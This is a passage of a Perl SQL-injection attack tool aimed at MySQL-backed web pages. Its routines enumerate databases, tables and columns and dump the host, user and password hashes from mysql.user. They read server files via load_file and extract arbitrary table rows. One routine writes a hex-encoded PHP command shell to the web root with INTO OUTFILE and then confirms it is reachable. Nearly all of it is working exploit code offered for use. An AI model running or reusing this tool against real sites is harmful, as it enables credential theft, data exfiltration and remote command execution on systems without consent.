$page1=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
$real = "1";
for my $limit(0..$limita) {
$code = toma($page1.$pass1."from".$pass1."information_schema.schemata".$pass1."limit".$pass1.$limit.",1".$pass2);
if ($code=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
my $control = $1;
if ($control ne "information_schema" and $control ne "mysql" and $control ne "phpmyadmin") {
print "[Database $real Found] $control\n";
savefile($save.".txt","[Database $real Found] : $control");
$real++;
}
}
}
} else {
print "[-] information_schema = ERROR\n";
}
}

sub schematablesdb {
my $page = $_[0];
my $db = $_[2];
my $page1 = $page;
savefile($_[3].".txt","\n");
print "\n\n[+] Searching tables with DB $db\n\n";
($pass1,$pass2) = &bypass($_[1]);
savefile($_[3].".txt","[DB] : $db");
$page =~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
$page1=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code = toma($page1.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2);
#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass2."\n";
if ($code=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {  
print "[+] Tables Length :  $1\n\n";
savefile($_[3].".txt","[+] Tables Length :  $1\n");
my $limit = $1;
$real = "1";
for my $lim(0..$limit) {
$code1 = toma($page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2);
#print $page.$pass1."from".$pass1."information_schema.tables".$pass1."where".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$lim.",1".$pass2."\n";
if ($code1 =~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
my $table = $1;
chomp $table;
savefile($_[3].".txt","[Table $real Found : $table ]");
print "[Table $real Found : $table ]\n";
$real++;
}}
} else {
print "\n[-] information_schema = ERROR\n";
}}

sub schemacolumnsdb {
my ($page,$bypass,$db,$table,$save) = @_;
my $page3 = $page;
my $page4 = $page;
print "\n\n[+] Searching columns in table $table with DB $db\n\n";
savefile($save.".txt","\n");
($pass1,$pass2) = &bypass($_[1]);
savefile($save.".txt","\n[DB] : $db");
savefile($save.".txt","[Table] : $table");
$page3=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code3 = toma($page3.$pass1."from".$pass1."information_schema.columns".$pass1."where".$pass1."table_name=char(".ascii($table).")".$pass1."and".$pass1."table_schema=char(".ascii($db).")".$pass2);
if ($code3=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
print "\n[Columns length : $1 ]\n\n";
savefile($save.".txt","[Columns length : $1 ]\n");
my $si = $1;
chomp $si;
$page4=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
$real = "1";
for my $limit2(0..$si) {
$code4 = toma($page4.$pass1."from".$pass1."information_schema.columns".$pass1."where".$pass1."table_name=char(".ascii($table).")".$pass1."and".$pass1."table_schema=char(".ascii($db).")".$pass1."limit".$pass1.$limit2.",1".$pass2);
if ($code4=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) { 
print "[Column $real] : $1\n";
savefile($save.".txt","[Column $real] : $1");
$real++;
}}
} else {
print "\n[-] information_schema = ERROR\n";
}}

sub mysqluser {
my ($page,$bypass,$save) = @_;
my $cop = $page;
my $cop1 = $page;
savefile($save.".txt","\n");
print "\n\n[+] Finding mysql.users\n";
($pass1,$pass2) = &bypass($bypass);
$page =~s/hackman/concat(char(82,65,84,83,88,80,68,79,87,78,49))/;
$code = toma($page.$pass1."from".$pass1."mysql.user".$pass2);
if ($code=~/RATSXPDOWN/ig){
$cop1 =~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code1 = toma($cop1.$pass1."from".$pass1."mysql.user".$pass2);
if ($code1=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
print "\n\n[+] Users Found : $1\n\n";
savefile($save.".txt","\n[+] Users mysql Found : $1\n");
for my $limit(0..$1) { 
$cop =~s/hackman/unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))/;
$code = toma($cop.$pass1."from".$pass1."mysql.user".$pass1."limit".$pass1.$limit.",1".$pass2);
if ($code=~/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/ig) {
print "[Host] : $1 [User] : $2 [Password] : $3\n";
savefile($save.".txt","[Host] : $1 [User] : $2 [Password] : $3");
} else {
&reload;
}}}
} else {
print "\n[-] mysql.user = ERROR\n";
}}

sub tabfuzz {
my $page = $_[0];
($pass1,$pass2) = &bypass($_[1]);
$count = "0";
savefile($_[2].".txt","\n");
print "\n";
if ($_[0] =~/(.*)hackman(.*)/g) {
my $start = $1; my $end = $2;
print "\n\n[+] Searching tables.....\n\n";
for my $table(@buscar2) {
chomp $table;
$concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52))))";
$injection = $start.$concat.$end.$pass1."from".$pass1.$table.$pass2;
$code = toma($injection);
if ($code =~/ERTOR854/g) {
$count++; 
print "[Table Found] : $table\n";
savefile($_[2].".txt","[Table Found] : $table");
}}}
if ($count eq "0") { print "[-] Not found any table\n";
&reload;
}
}

sub colfuzz {
my $page = $_[0];
($pass1,$pass2) = &bypass($_[1]);
$count = "0";
savefile($_[3].".txt","\n");
print "\n";
if ($_[0] =~/(.*)hackman(.*)/) { 
my $start = $1; my $end = $2;
print "[+] Searching columns for the table $_[2]...\n\n";
savefile($_[3].".txt","[Table] : $_[2]");
for my $columns(@buscar1) {
chomp $columns;
$concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),$columns,char(69,82,84,79,82,56,53,52))))";
$code = toma($start.$concat.$end.$pass1."from".$pass1.$_[2].$pass2);
if ($code =~/ERTOR854/g) {
print "[Column] : $columns\n";
savefile($_[3].".txt","[Column Found] : $columns");
}}
} else {
print "\n[Example] : $0 http://127.0.0.1/tester/sql.php?id=-1+union+select+hackman,2,3 hackers\n\n"; &copyright;
}
}

sub load {
savefile($_[2].".txt","\n");
print "\n";
($pass1,$pass2) = &bypass($_[1]);
if ($_[0] =~/(.*)hackman(.*)/g) {
print "\n[+] Searching files with load_file...\n\n\n";
my $start = $1; my $end = $2;
for my $file(@buscar3) {
chomp $file;
$concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(".encode($file)."),char(69,82,84,79,82,56,53,52))))";
$code = toma($start.$concat.$end.$pass2);
if ($code =~/ERTOR854(.*)ERTOR854/g) {
print "[File Found] : $file\n";
print "\n[Source Start]\n\n";
print $1;
print "\n\n[Source End]\n\n";
savefile($_[2].".txt","[File Found] : $file");
savefile($_[2].".txt","\n[Source Start]\n");
savefile($_[2].".txt","$1");
savefile($_[2].".txt","\n[Source End]\n");
}}}}

sub dump {
savefile($_[5].".txt","\n");
print "\n";
my $page = $_[0];
($pass1,$pass2) = &bypass($_[4]);
if ($page=~/(.*)hackman(.*)/){ 
my $start = $1;
my $end = $2;
print "[+] Extracting values...\n\n";
$concatx = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),count($_[1]),char(69,82,84,79,82,56,53,52))))";
$val_code = toma($start.$concatx.$end.$pass1."from".$pass1.$_[3].$pass2);
$concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),$_[1],char(69,82,84,79,82,56,53,52),$_[2],char(69,82,84,79,82,56,53,52))))";
if ($val_code=~/ERTOR854(.*)ERTOR854/ig) {
$tota = $1; 
print "[+] Table : $_[3]\n";
print "[+] Length of the rows : $tota\n\n";
print "[$_[1]] [$_[2]]\n\n";
savefile($_[5].".txt","[Table] : $_[3]");
savefile($_[5].".txt","[+] Length of the rows: $tota\n");
savefile($_[5].".txt","[$_[1]] [$_[2]]\n");
for my $limit(0..$tota) { 
chomp $limit;
$injection = toma($start.$concat.$end.$pass1."from".$pass1.$_[3].$pass1."limit".$pass1.$limit.",1".$pass2);
if ($injection=~/ERTOR854(.*)ERTOR854(.*)ERTOR854/ig) {
savefile($_[5].".txt","[$_[1]] : $1   [$_[2]] : $2");
print "[$_[1]] : $1   [$_[2]] : $2\n"; 
} else {
print "\n\n[+] Extracting Finish\n"; 
&reload;
}
}
} else {
print "[-] Not Found any DATA\n\n";
}}}

sub encode {
my $string = $_[0];
$hex = '0x';
for (split //,$string) {
$hex .= sprintf "%x", ord;
}return $hex;}

sub decode {
$_[0] =~ s/^0x//;
$encode = join q[], map { chr hex } $_[0] =~ /../g;
return $encode;
}

sub finish {
&copyright;
<STDIN>;
exit(1);
}


sub into {
print "\n\n[Status] : Injecting a SQLI for create a shell\n\n";
my ($page,$bypass,$dir,$save) = @_;
savefile($save.".txt","\n");
print "\n";
($pass1,$pass2) = &bypass($bypass);
my ($scheme, $auth, $path, $query, $frag)  = uri_split($page);
if ($path=~/\/(.*)$/) { 	
my $path1 = $1;
my $path2 = $path1;
$path2 =~s/$1//;
$dir =~s/$path1//ig;
$shell = $dir."/"."shell.php";
if ($page =~/(.*)hackman(.*)/ig) {
my  ($start,$end) = ($1,$2);
$code = toma($start."0x3c7469746c653e4d696e69205368656c6c20427920446f6464793c2f7469746c653e3c3f7068702069662028697373657428245f4745545b27636d64275d2929207b2073797374656d28245f4745545b27636d64275d293b7d3f3e".$end.$pass1."into".$pass1."outfile".$pass1."'".$shell."'".$pass2);
$code1 = toma("http://".$auth."/".$path2."/"."shell.php");
if ($code1=~/Mini Shell By Doddy/ig) {
print "[shell up] : http://".$auth."/".$path2."/"."shell.php"."\a\a";
savefile($save.".txt","[shell up] : http://".$auth."/".$path2."/"."shell.php");
} else {
print "[shell] : Not Found\n";
}
}
}
}

#blog : doddy-hackman.blogspot.com
#contact : lepuke[at]hotmail[Com] 
#The end